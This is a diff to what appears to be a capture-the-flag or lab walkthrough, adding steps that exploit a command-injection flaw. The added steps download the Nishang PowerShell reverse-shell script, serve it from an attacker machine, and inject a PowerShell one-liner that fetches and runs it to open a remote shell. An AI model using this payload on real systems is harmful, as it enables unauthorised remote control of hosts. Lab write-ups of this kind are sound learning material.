@@ -69,7 +69,21 @@ Find a feature of the tool that allows you to execute commands on the underlying
 
 You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: python3 -m http.server
 
-### Creating the script on our attacker machine
+### Download the Nishang Script 
+1. Run the following
+```shell
+wget ttps://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+```
+2. Start our webserver on out attacker machine with the following
+```bash
+python -m http.server 8000
+```
 
+### Exploit the command injection vulnerability
+We can now exploit the command injection vulnerability in the vulnerable part of the application to get a reverse shell by the command below
 
+```shell
+powershell iex (New-Object  Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp  -Reverse -IPAddress your-ip -Port your-port
+```
 
+replace http://your-ip:your-port/Invoke-PowerShellTcp.ps1 with the address obtained from your updog webserver
